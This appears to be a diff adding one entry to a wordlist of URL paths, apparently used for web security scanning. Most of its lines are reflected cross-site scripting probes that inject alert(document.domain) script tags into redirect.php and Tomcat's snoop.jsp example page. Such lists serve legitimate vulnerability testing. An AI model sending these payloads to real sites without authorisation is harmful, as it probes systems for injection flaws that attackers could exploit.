@@ -4,3 +4,4 @@
 /login.action
 /redirect.php/%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E?subject=server&server=test
 /redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test
+/examples/jsp/snp/snoop.jsp;<script>alert(document.domain)</script>test.jsp
